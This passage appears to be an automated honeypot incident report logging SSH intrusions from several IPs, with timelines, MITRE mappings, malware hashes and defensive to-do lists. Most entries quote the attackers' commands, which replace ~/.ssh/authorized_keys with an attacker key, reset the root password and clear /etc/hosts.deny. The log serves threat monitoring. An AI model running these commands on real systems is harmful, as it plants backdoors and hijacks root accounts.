| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:39 |
| **Last Seen** | 2026-06-04 07:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:39:50` | `cowrie.session.connect` |
| `2026-06-04 07:39:50` | `cowrie.client.version` |
| `2026-06-04 07:39:50` | `cowrie.client.kex` |
| `2026-06-04 07:39:51` | `cowrie.login.success` |
| `2026-06-04 07:39:51` | `cowrie.session.params` |
| `2026-06-04 07:39:51` | `cowrie.command.input` |
| `2026-06-04 07:39:51` | `cowrie.command.failed` |
| `2026-06-04 07:39:51` | `cowrie.log.closed` |
| `2026-06-04 07:39:51` | `cowrie.session.params` |
| `2026-06-04 07:39:51` | `cowrie.command.input` |
| `2026-06-04 07:39:51` | `cowrie.session.file_download` |
| `2026-06-04 07:39:51` | `cowrie.log.closed` |
| `2026-06-04 07:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5dc6024a34

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 07:39 |
| **Last Seen** | 2026-06-04 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:39:53` | `cowrie.session.connect` |
| `2026-06-04 07:39:53` | `cowrie.client.version` |
| `2026-06-04 07:39:53` | `cowrie.client.kex` |
| `2026-06-04 07:39:53` | `cowrie.login.success` |
| `2026-06-04 07:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f47b7a0b7b4

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:45 |
| **Last Seen** | 2026-06-04 07:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:45:28` | `cowrie.session.connect` |
| `2026-06-04 07:45:28` | `cowrie.client.version` |
| `2026-06-04 07:45:28` | `cowrie.client.kex` |
| `2026-06-04 07:45:29` | `cowrie.login.success` |
| `2026-06-04 07:45:29` | `cowrie.session.params` |
| `2026-06-04 07:45:29` | `cowrie.command.input` |
| `2026-06-04 07:45:29` | `cowrie.command.failed` |
| `2026-06-04 07:45:29` | `cowrie.log.closed` |
| `2026-06-04 07:45:30` | `cowrie.session.params` |
| `2026-06-04 07:45:30` | `cowrie.command.input` |
| `2026-06-04 07:45:30` | `cowrie.session.file_download` |
| `2026-06-04 07:45:30` | `cowrie.log.closed` |
| `2026-06-04 07:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3081950e31b

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:45 |
| **Last Seen** | 2026-06-04 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:45:32` | `cowrie.session.connect` |
| `2026-06-04 07:45:32` | `cowrie.client.version` |
| `2026-06-04 07:45:32` | `cowrie.client.kex` |
| `2026-06-04 07:45:33` | `cowrie.login.success` |
| `2026-06-04 07:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90e11865a273

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:47 |
| **Last Seen** | 2026-06-04 07:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:47:29` | `cowrie.session.connect` |
| `2026-06-04 07:47:29` | `cowrie.client.version` |
| `2026-06-04 07:47:29` | `cowrie.client.kex` |
| `2026-06-04 07:47:29` | `cowrie.login.success` |
| `2026-06-04 07:47:30` | `cowrie.session.params` |
| `2026-06-04 07:47:30` | `cowrie.command.input` |
| `2026-06-04 07:47:30` | `cowrie.command.failed` |
| `2026-06-04 07:47:30` | `cowrie.log.closed` |
| `2026-06-04 07:47:30` | `cowrie.session.params` |
| `2026-06-04 07:47:30` | `cowrie.command.input` |
| `2026-06-04 07:47:30` | `cowrie.session.file_download` |
| `2026-06-04 07:47:30` | `cowrie.log.closed` |
| `2026-06-04 07:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9df1f3e25a

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:47 |
| **Last Seen** | 2026-06-04 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:47:32` | `cowrie.session.connect` |
| `2026-06-04 07:47:32` | `cowrie.client.version` |
| `2026-06-04 07:47:32` | `cowrie.client.kex` |
| `2026-06-04 07:47:33` | `cowrie.login.success` |
| `2026-06-04 07:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4f81a7e884

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:00 |
| **Last Seen** | 2026-06-04 08:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:00:14` | `cowrie.session.connect` |
| `2026-06-04 08:00:14` | `cowrie.client.version` |
| `2026-06-04 08:00:14` | `cowrie.client.kex` |
| `2026-06-04 08:00:14` | `cowrie.login.success` |
| `2026-06-04 08:00:14` | `cowrie.session.params` |
| `2026-06-04 08:00:14` | `cowrie.command.input` |
| `2026-06-04 08:00:14` | `cowrie.command.failed` |
| `2026-06-04 08:00:15` | `cowrie.log.closed` |
| `2026-06-04 08:00:15` | `cowrie.session.params` |
| `2026-06-04 08:00:15` | `cowrie.command.input` |
| `2026-06-04 08:00:15` | `cowrie.session.file_download` |
| `2026-06-04 08:00:15` | `cowrie.log.closed` |
| `2026-06-04 08:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81cd1dbb663

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:00 |
| **Last Seen** | 2026-06-04 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:00:16` | `cowrie.session.connect` |
| `2026-06-04 08:00:16` | `cowrie.client.version` |
| `2026-06-04 08:00:16` | `cowrie.client.kex` |
| `2026-06-04 08:00:17` | `cowrie.login.success` |
| `2026-06-04 08:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8bcc113e57

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-06-04 08:00 |
| **Last Seen** | 2026-06-04 08:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:00:19` | `cowrie.session.connect` |
| `2026-06-04 08:00:19` | `cowrie.client.version` |
| `2026-06-04 08:00:19` | `cowrie.client.kex` |
| `2026-06-04 08:00:19` | `cowrie.login.success` |
| `2026-06-04 08:00:19` | `cowrie.session.params` |
| `2026-06-04 08:00:19` | `cowrie.command.input` |
| `2026-06-04 08:00:19` | `cowrie.command.failed` |
| `2026-06-04 08:00:20` | `cowrie.log.closed` |
| `2026-06-04 08:00:20` | `cowrie.session.params` |
| `2026-06-04 08:00:20` | `cowrie.command.input` |
| `2026-06-04 08:00:20` | `cowrie.session.file_download` |
| `2026-06-04 08:00:20` | `cowrie.log.closed` |
| `2026-06-04 08:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0495b4696d94

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-06-04 08:00 |
| **Last Seen** | 2026-06-04 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:00:22` | `cowrie.session.connect` |
| `2026-06-04 08:00:22` | `cowrie.client.version` |
| `2026-06-04 08:00:22` | `cowrie.client.kex` |
| `2026-06-04 08:00:23` | `cowrie.login.success` |
| `2026-06-04 08:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dd209572596

| Field | Detail |
|---|---|
| **Source IP** | `101.227.203[.]162` |
| **First Seen** | 2026-06-04 08:02 |
| **Last Seen** | 2026-06-04 08:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8Di0JdqyIfCG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:02:32` | `cowrie.session.connect` |
| `2026-06-04 08:02:33` | `cowrie.client.version` |
| `2026-06-04 08:02:33` | `cowrie.client.kex` |
| `2026-06-04 08:02:34` | `cowrie.login.success` |
| `2026-06-04 08:02:34` | `cowrie.session.params` |
| `2026-06-04 08:02:34` | `cowrie.command.input` |
| `2026-06-04 08:02:34` | `cowrie.command.failed` |
| `2026-06-04 08:02:34` | `cowrie.log.closed` |
| `2026-06-04 08:02:35` | `cowrie.session.params` |
| `2026-06-04 08:02:35` | `cowrie.command.input` |
| `2026-06-04 08:02:35` | `cowrie.session.file_download` |
| `2026-06-04 08:02:35` | `cowrie.log.closed` |
| `2026-06-04 08:02:43` | `cowrie.session.params` |
| `2026-06-04 08:02:43` | `cowrie.command.input` |
| `2026-06-04 08:02:43` | `cowrie.log.closed` |
| `2026-06-04 08:02:43` | `cowrie.session.params` |
| `2026-06-04 08:02:43` | `cowrie.command.input` |
| `2026-06-04 08:02:43` | `cowrie.log.closed` |
| `2026-06-04 08:02:44` | `cowrie.session.params` |
| `2026-06-04 08:02:44` | `cowrie.command.input` |
| `2026-06-04 08:02:44` | `cowrie.session.file_download` |
| `2026-06-04 08:02:44` | `cowrie.log.closed` |
| `2026-06-04 08:02:44` | `cowrie.session.params` |
| `2026-06-04 08:02:44` | `cowrie.command.input` |
| `2026-06-04 08:02:44` | `cowrie.log.closed` |
| `2026-06-04 08:02:45` | `cowrie.session.params` |
| `2026-06-04 08:02:45` | `cowrie.command.input` |
| `2026-06-04 08:02:45` | `cowrie.log.closed` |
| `2026-06-04 08:02:45` | `cowrie.session.params` |
| `2026-06-04 08:02:45` | `cowrie.command.input` |
| `2026-06-04 08:02:45` | `cowrie.command.input` |
| `2026-06-04 08:02:45` | `cowrie.log.closed` |
| `2026-06-04 08:02:45` | `cowrie.session.params` |
| `2026-06-04 08:02:45` | `cowrie.command.input` |
| `2026-06-04 08:02:46` | `cowrie.log.closed` |
| `2026-06-04 08:02:46` | `cowrie.session.params` |
| `2026-06-04 08:02:46` | `cowrie.command.input` |
| `2026-06-04 08:02:46` | `cowrie.log.closed` |
| `2026-06-04 08:02:46` | `cowrie.session.params` |
| `2026-06-04 08:02:46` | `cowrie.command.input` |
| `2026-06-04 08:02:46` | `cowrie.log.closed` |
| `2026-06-04 08:02:47` | `cowrie.session.params` |
| `2026-06-04 08:02:47` | `cowrie.command.input` |
| `2026-06-04 08:02:47` | `cowrie.log.closed` |
| `2026-06-04 08:02:47` | `cowrie.session.params` |
| `2026-06-04 08:02:47` | `cowrie.command.input` |
| `2026-06-04 08:02:47` | `cowrie.log.closed` |
| `2026-06-04 08:02:48` | `cowrie.session.params` |
| `2026-06-04 08:02:48` | `cowrie.command.input` |
| `2026-06-04 08:02:48` | `cowrie.log.closed` |
| `2026-06-04 08:02:48` | `cowrie.session.params` |
| `2026-06-04 08:02:48` | `cowrie.command.input` |
| `2026-06-04 08:02:48` | `cowrie.log.closed` |
| `2026-06-04 08:02:49` | `cowrie.session.params` |
| `2026-06-04 08:02:49` | `cowrie.command.input` |
| `2026-06-04 08:02:49` | `cowrie.log.closed` |
| `2026-06-04 08:02:49` | `cowrie.session.params` |
| `2026-06-04 08:02:49` | `cowrie.command.input` |
| `2026-06-04 08:02:49` | `cowrie.log.closed` |
| `2026-06-04 08:02:49` | `cowrie.session.params` |
| `2026-06-04 08:02:49` | `cowrie.command.input` |
| `2026-06-04 08:02:50` | `cowrie.log.closed` |
| `2026-06-04 08:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.227.203[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.227.203[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67134e6b477c

| Field | Detail |
|---|---|
| **Source IP** | `36.82.45[.]61` |
| **First Seen** | 2026-06-04 08:05 |
| **Last Seen** | 2026-06-04 08:06 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:l9nxz1VR5Hyp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:05:47` | `cowrie.session.connect` |
| `2026-06-04 08:05:47` | `cowrie.client.version` |
| `2026-06-04 08:05:47` | `cowrie.client.kex` |
| `2026-06-04 08:05:47` | `cowrie.login.success` |
| `2026-06-04 08:05:47` | `cowrie.session.params` |
| `2026-06-04 08:05:47` | `cowrie.command.input` |
| `2026-06-04 08:05:47` | `cowrie.command.failed` |
| `2026-06-04 08:05:48` | `cowrie.log.closed` |
| `2026-06-04 08:05:48` | `cowrie.session.params` |
| `2026-06-04 08:05:48` | `cowrie.command.input` |
| `2026-06-04 08:05:48` | `cowrie.session.file_download` |
| `2026-06-04 08:05:48` | `cowrie.log.closed` |
| `2026-06-04 08:05:57` | `cowrie.session.params` |
| `2026-06-04 08:05:57` | `cowrie.command.input` |
| `2026-06-04 08:05:58` | `cowrie.log.closed` |
| `2026-06-04 08:05:58` | `cowrie.session.params` |
| `2026-06-04 08:05:58` | `cowrie.command.input` |
| `2026-06-04 08:05:58` | `cowrie.log.closed` |
| `2026-06-04 08:05:58` | `cowrie.session.params` |
| `2026-06-04 08:05:58` | `cowrie.command.input` |
| `2026-06-04 08:05:58` | `cowrie.session.file_download` |
| `2026-06-04 08:05:58` | `cowrie.log.closed` |
| `2026-06-04 08:05:58` | `cowrie.session.params` |
| `2026-06-04 08:05:58` | `cowrie.command.input` |
| `2026-06-04 08:05:59` | `cowrie.log.closed` |
| `2026-06-04 08:05:59` | `cowrie.session.params` |
| `2026-06-04 08:05:59` | `cowrie.command.input` |
| `2026-06-04 08:05:59` | `cowrie.log.closed` |
| `2026-06-04 08:05:59` | `cowrie.session.params` |
| `2026-06-04 08:05:59` | `cowrie.command.input` |
| `2026-06-04 08:05:59` | `cowrie.command.input` |
| `2026-06-04 08:05:59` | `cowrie.log.closed` |
| `2026-06-04 08:05:59` | `cowrie.session.params` |
| `2026-06-04 08:05:59` | `cowrie.command.input` |
| `2026-06-04 08:05:59` | `cowrie.log.closed` |
| `2026-06-04 08:06:00` | `cowrie.session.params` |
| `2026-06-04 08:06:00` | `cowrie.command.input` |
| `2026-06-04 08:06:00` | `cowrie.log.closed` |
| `2026-06-04 08:06:00` | `cowrie.session.params` |
| `2026-06-04 08:06:00` | `cowrie.command.input` |
| `2026-06-04 08:06:00` | `cowrie.log.closed` |
| `2026-06-04 08:06:00` | `cowrie.session.params` |
| `2026-06-04 08:06:00` | `cowrie.command.input` |
| `2026-06-04 08:06:01` | `cowrie.log.closed` |
| `2026-06-04 08:06:01` | `cowrie.session.params` |
| `2026-06-04 08:06:01` | `cowrie.command.input` |
| `2026-06-04 08:06:01` | `cowrie.log.closed` |
| `2026-06-04 08:06:01` | `cowrie.session.params` |
| `2026-06-04 08:06:01` | `cowrie.command.input` |
| `2026-06-04 08:06:01` | `cowrie.log.closed` |
| `2026-06-04 08:06:01` | `cowrie.session.params` |
| `2026-06-04 08:06:01` | `cowrie.command.input` |
| `2026-06-04 08:06:02` | `cowrie.log.closed` |
| `2026-06-04 08:06:02` | `cowrie.session.params` |
| `2026-06-04 08:06:02` | `cowrie.command.input` |
| `2026-06-04 08:06:02` | `cowrie.log.closed` |
| `2026-06-04 08:06:02` | `cowrie.session.params` |
| `2026-06-04 08:06:02` | `cowrie.command.input` |
| `2026-06-04 08:06:02` | `cowrie.log.closed` |
| `2026-06-04 08:06:02` | `cowrie.session.params` |
| `2026-06-04 08:06:02` | `cowrie.command.input` |
| `2026-06-04 08:06:02` | `cowrie.log.closed` |
| `2026-06-04 08:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.82.45[.]61` to AbuseIPDB if not already reported
- [ ] Block `36.82.45[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea37a2b5c878

| Field | Detail |
|---|---|
| **Source IP** | `101.227.203[.]162` |
| **First Seen** | 2026-06-04 08:07 |
| **Last Seen** | 2026-06-04 08:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
